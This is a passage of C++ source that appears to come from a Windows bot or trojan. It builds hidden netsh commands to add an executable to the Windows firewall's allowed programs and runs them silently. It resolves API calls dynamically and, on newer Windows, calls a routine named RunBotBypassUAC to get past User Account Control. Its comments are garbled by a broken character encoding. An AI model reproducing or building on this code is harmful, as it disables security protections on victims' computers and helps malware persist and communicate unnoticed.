	char* cmdDel = (char*)HEAP::Alloc(512);

	fwsprintfA pwsprintfA = Get_wsprintfA();
    OSVERSIONINFOA ver;
    ver.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA); 
    pGetVersionExA(&ver);
	if( ver.dwMajorVersion >= 6 )
	{
		pwsprintfA( cmdDel, GetStr(NetshFirewallWin7Del).t_str(), name );
		pwsprintfA( cmdAdd, GetStr(NetshFirewallWin7Add).t_str(), name, pathExe );
	}
	else
	{
		cmdDel[0] = 0;
		pwsprintfA( cmdAdd, GetStr(NetshFirewallWinXp).t_str(), pathExe, name );
	}
	
	VDRDBG( "Video", "Del: %s", cmdDel );
	VDRDBG( "Video", "Add: %s", cmdAdd );
	if( cmdDel[0] )
		RunFileA( cmdDel, true, true );
	bool ret = RunFileA( cmdAdd, true, true );

	HEAP::Free(cmdAdd);
	HEAP::Free(cmdDel);
	pSetCurrentDirectoryA(currDir);
	
	return ret;
}

bool AddAllowedprogramUAC( const char* pathExe )
{
    OSVERSIONINFOA ver;
    ver.dwOSVersionInfoSize = sizeof(OSVERSIONINFOA); 
	pGetVersionExA(&ver);
	if( ver.dwMajorVersion < 6 ) 
		return AddAllowedprogram(pathExe);
	else //��� 7-�� ������ ����� ����� ����
	{
		bool res = RunBotBypassUAC( 0, UAC_CMD_AddAllowed, pathExe );
		if( res ) pSleep(10000); //���� ���� ���������� �������
		return res;
	}
}
